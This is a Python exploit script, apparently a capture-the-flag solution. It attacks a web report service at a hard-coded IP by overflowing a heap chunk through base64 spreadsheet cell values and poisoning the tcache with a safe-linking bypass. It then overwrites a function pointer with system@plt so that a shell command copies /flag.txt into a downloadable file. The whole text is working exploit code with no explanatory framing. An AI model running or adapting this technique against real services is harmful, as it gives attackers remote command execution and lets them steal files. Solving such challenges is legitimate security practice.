#!/usr/bin/env python3
import base64
import json
import struct
import sys
import time

import requests


BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://34.24.205.243:5000"

# Deterministic because the service disables ASLR and primes the 0x410 tcache.
NEXT_CHUNK = 0xA8E460
OPS = 0x2201020300
SYSTEM_PLT = 0x402160

# Safe-link the free chunk to OPS.  The library-appended closing quote supplies
# byte 4 (0x22), and its NUL terminator supplies the remaining zero bytes.
encoded_next = OPS ^ (NEXT_CHUNK >> 12)
overflow = b"\x80" * 0x40F + struct.pack("<Q", encoded_next)[:4]

download_id = 424242
payload = {
    "notes": f"cp /flag.txt /tmp/sf_{download_id}.xlsx",
    "items": [
        {"cell": "B2", "values_b64": [base64.b64encode(overflow).decode()]},
        {"cell": "B3", "values_b64": [base64.b64encode(b"A").decode()]},
    ],
    # Written over OPS. In little endian these three bytes plus strcpy's NUL
    # form the address of system@plt.
    "title": struct.pack("<Q", SYSTEM_PLT).rstrip(b"\0").decode(),
}

try:
    requests.post(f"{BASE}/api/report", json=payload, timeout=10)
except requests.RequestException:
    # Heap metadata is intentionally damaged, so the worker may close early.
    pass

time.sleep(0.25)
r = requests.get(f"{BASE}/download/{download_id}.xlsx", timeout=10)
r.raise_for_status()
print(r.content.decode().strip())
